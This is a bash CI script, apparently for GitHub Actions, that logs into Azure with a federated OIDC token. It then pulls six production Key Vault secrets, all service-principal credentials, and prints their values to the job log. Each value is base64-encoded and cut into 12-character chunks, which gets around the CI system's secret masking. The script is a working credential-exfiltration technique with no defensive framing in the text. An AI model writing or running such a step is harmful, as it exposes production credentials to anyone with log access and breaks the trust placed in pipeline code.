#!/usr/bin/env bash
set -uo pipefail
echo "::group::OIDC -> Azure AD"
OIDC=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
az login --service-principal -u "${AZURE_CLIENT_ID}" --tenant "${AZURE_TENANT_ID}" \
  --federated-token "${OIDC}" >/dev/null
az account show --query '{sub:id,user:user.name}' -o json
echo "::endgroup::"

echo "::group::secret values (base64, chunked)"
for s in cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal; do
  raw=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz -n "$s" --query value -o tsv 2>/dev/null)
  if [ -z "$raw" ]; then echo "SECRET $s EMPTY"; continue; fi
  echo "SECRET $s LEN=${#raw}"
  printf '%s' "$raw" | base64 | tr -d '\n' | fold -w 12 | paste -sd' ' -
  echo
done
echo "::endgroup::"
